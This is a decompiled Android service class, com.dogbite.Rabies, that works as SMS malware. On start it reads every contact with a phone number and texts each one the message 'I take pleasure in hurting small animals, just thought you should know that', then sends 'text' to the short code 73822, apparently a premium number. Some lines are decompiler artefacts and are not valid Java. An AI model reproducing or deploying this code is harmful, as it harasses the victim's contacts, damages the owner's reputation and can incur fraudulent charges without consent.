package com.dogbite;

import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.SmsManager;

public class Rabies
  extends Service
{
  public IBinder onBind(Intent paramIntent)
  {
    IBinder localIBinder = null;
    return localIBinder;
  }
  
  public void onCreate()
  {
    super.onCreate();
  }
  
  public void onDestroy()
  {
    super.onDestroy();
  }
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    ContentResolver localContentResolver1 = getContentResolver();
    Uri localUri = ContactsContract.Contacts.CONTENT_URI;
    Object localObject2 = null;
    Object localObject3 = null;
    Object localObject4 = null;
    String str5 = null;
    Cursor localCursor1 = localContentResolver1.query(localUri, (String[])localObject2, (String)localObject3, (String[])localObject4, str5);
    SmsManager localSmsManager = SmsManager.getDefault();
    int i = localCursor1.getCount();
    if (i > 0) {}
    String str7;
    int m;
    do
    {
      boolean bool1 = localCursor1.moveToNext();
      if (!bool1) {
        return;
      }
      String str1 = "_id";
      int j = localCursor1.getColumnIndex(str1);
      str7 = localCursor1.getString(j);
      String str2 = "has_phone_number";
      int k = localCursor1.getColumnIndex(str2);
      String str3 = localCursor1.getString(k);
      m = Integer.parseInt(str3);
    } while (m <= 0);
    ContentResolver localContentResolver2 = getContentResolver();
    localObject2 = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
    localObject3 = null;
    localObject4 = new java/lang/StringBuilder;
    str5 = "contact_id = ";
    ((StringBuilder)localObject4).<init>(str5);
    localObject4 = ((StringBuilder)localObject4).append(str7);
    localObject4 = ((StringBuilder)localObject4).toString();
    str5 = null;
    String str6 = null;
    Cursor localCursor2 = localContentResolver2.query((Uri)localObject2, (String[])localObject3, (String)localObject4, str5, str6);
    for (;;)
    {
      boolean bool2 = localCursor2.moveToNext();
      if (!bool2)
      {
        localObject4 = "73822";
        str5 = null;
        str6 = "text";
        PendingIntent localPendingIntent1 = null;
        PendingIntent localPendingIntent2 = null;
        localObject3 = localSmsManager;
        ((SmsManager)localObject3).sendTextMessage((String)localObject4, str5, str6, localPendingIntent1, localPendingIntent2);
        break;
      }
      String str4 = "data1";
      int n = localCursor2.getColumnIndex(str4);
      localObject2 = localCursor2.getString(n);
      localObject3 = null;
      localObject4 = "I take pleasure in hurting small animals, just thought you should know that";
      str5 = null;
      str6 = null;
      Object localObject1 = localSmsManager;
      ((SmsManager)localObject1).sendTextMessage((String)localObject2, (String)localObject3, (String)localObject4, str5, str6);
    }
  }
}

/* Location:
 * Qualified Name:     com.dogbite.Rabies
 * Java Class Version: 1.2 (46.0)
 * JD-Core Version:    0.7.1
 */